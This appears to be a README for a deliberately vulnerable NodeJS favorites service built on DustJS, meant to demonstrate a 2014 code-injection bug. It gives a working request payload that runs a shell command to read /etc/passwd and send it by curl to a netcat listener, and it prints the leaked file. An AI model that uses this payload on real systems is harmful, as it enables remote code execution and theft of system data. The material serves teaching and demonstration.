# Vulnerable Favorites Service

This service is a dummy favorites service written in NodeJS and using the DustJS framework.

There is a deliberate vulnerability in this application which allows remote code injection due to an eval bug in DustJS.

**NOTE:** This vulnerability dates back to 2014 and has since been patched, this is only for information purposes to highlight how code injection can be used to bypass perimeter firewalls.

# WARNING
This service is for demonstration purposes only and should not be deployed to a production environment!

# Running the service - simple example

First start the service:

```bash
$ yarn start
yarn run v1.13.0
warning package.json: No license field
$ node ./app.js
Example app listening on port 3000!
```

Then run netcat to accept data from the vulnerability on port 5000

```bash
$ nc -lv -p 5000
listening on [any] 5000 ...
```

Send a malformed request to the service which lists /etc/passwd and forwards this to localhost:5000 where your netcat server is running

```
http://localhost:3000/?device[]=x&device[]=y%27-require(%27child_process%27).exec(%27curl+-F+%22x=`cat+/etc/passwd`%22+localhost:5000%27)-%27
```

You should see the following response in the netcat output

```bash
connect to [127.0.0.1] from localhost [127.0.0.1] 35218
POST / HTTP/1.1
Host: localhost:5000
User-Agent: curl/7.52.1
Accept: */*
Content-Length: 1734
Expect: 100-continue
Content-Type: multipart/form-data; boundary=------------------------9a601d056e16f015

--------------------------9a601d056e16f015
Content-Disposition: form-data; name="x"

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/bin/false
systemd-timesync:x:101:104:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:102:105:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:103:106:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:104:107:systemd Bus Proxy,,,:/run/systemd:/bin/false
messagebus:x:105:108::/var/run/dbus:/bin/false
rtkit:x:106:109:RealtimeKit,,,:/proc:/bin/false
sshd:x:107:65534::/run/sshd:/usr/sbin/nologin
pulse:x:108:110:PulseAudio daemon,,,:/var/run/pulse:/bin/false
android-root:x:655360:655360::/dev/null:/bin/false
jacksonnic:x:1000:1000::/home/jacksonnic:/usr/bin/zsh
Debian-exim:x:109:112::/var/spool/exim4:/bin/false
--------------------------9a601d056e16f015--
```
